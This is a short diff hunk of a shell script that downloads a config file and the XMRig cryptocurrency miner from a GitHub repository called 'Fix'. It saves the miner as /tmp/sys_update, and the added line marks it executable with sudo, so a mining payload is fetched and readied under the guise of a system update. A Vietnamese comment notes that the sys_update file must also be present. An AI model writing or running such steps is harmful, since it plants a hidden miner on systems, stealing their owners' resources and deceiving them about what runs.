@@ -13,3 +13,5 @@ sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.
 # Đảm bảo file thực thi sys_update cũng nằm ở đây
 
 sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /tmp/sys_update
+
+sudo chmod +x /tmp/sys_update
